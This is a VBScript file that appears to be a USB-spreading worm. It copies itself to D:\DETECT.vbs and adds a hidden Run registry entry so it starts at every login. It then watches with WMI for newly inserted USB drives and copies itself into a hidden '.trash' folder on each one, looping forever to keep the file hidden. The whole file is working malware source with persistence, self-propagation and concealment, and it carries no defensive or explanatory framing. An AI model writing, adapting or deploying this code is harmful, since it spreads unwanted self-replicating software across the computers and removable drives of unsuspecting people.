set copy1 = createobject("scripting.filesystemobject")          
copy1.getfile(wscript.scriptfullname).copy("D:\DETECT.vbs")

CreateObject("wscript.shell").run _
    "reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\" & _
    "CurrentVersion\Run"" /v ""DOO"" /d ""D:\DETECT.vbs"" /f", vbhide

'set ws= CreateObject("WScript.Shell")
'ws.Run "D:\DETECT.vbs", vbhide

Const Configuration_Changed = 1
Const Device_Arrival = 2
Const Device_Removal = 3
Const Docking = 4
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" _
    & strComputer & "\root\cimv2")
Set colMonitoredEvents = objWMIService. _
    ExecNotificationQuery( _
        "Select * from Win32_VolumeChangeEvent")
Do
    Set objLatestEvent = colMonitoredEvents.NextEvent
    Select Case objLatestEvent.EventType
        Case Device_Arrival
            USB_IN(objLatestEvent.DriveName)
        Case Device_Removal
            USB_OUT(objLatestEvent.DriveName)
    End Select
Loop

sub USB_IN(DriveName)
    WScript.Echo "USB IN, ID IS: " & DriveName
    set fso=CreateObject("Scripting.FileSystemObject")
    if fso.folderexists(DriveName & "\.trash") = false then _
        fso.createfolder DriveName & "\.trash"
    CreateObject("wscript.shell").run _
        "cmd.exe /c copy D:\DETECT.vbs " & DriveName & "\.trash", vbhide
    WScript.Sleep 1000
    Set FSO = CreateObject("Scripting.FileSystemObject")
    Const Hidden = 2
    Set f = FSO.GetFile(DriveName & "\.trash\DETECT.vbs")
    f.Attributes = f.Attributes Or Hidden
    do while true
        f.Attributes = f.Attributes Or Hidden
        'Set objLatestEvent = colMonitoredEvents.NextEvent
        'if objLatestEvent.EventType = Device_Removal then
        '    WScript.Echo "USB OUT, ID ID: " & DriveName
        '    exit do
        'end if
    loop
end sub

sub USB_OUT(DriveName)
    WScript.Echo "USB OUT, ID ID: " & DriveName
end sub

' DELETE SELF-FILE
'Set FSO = CreateObject("Scripting.FileSystemObject")
'FSO.DeleteFile WScript.ScriptFullName
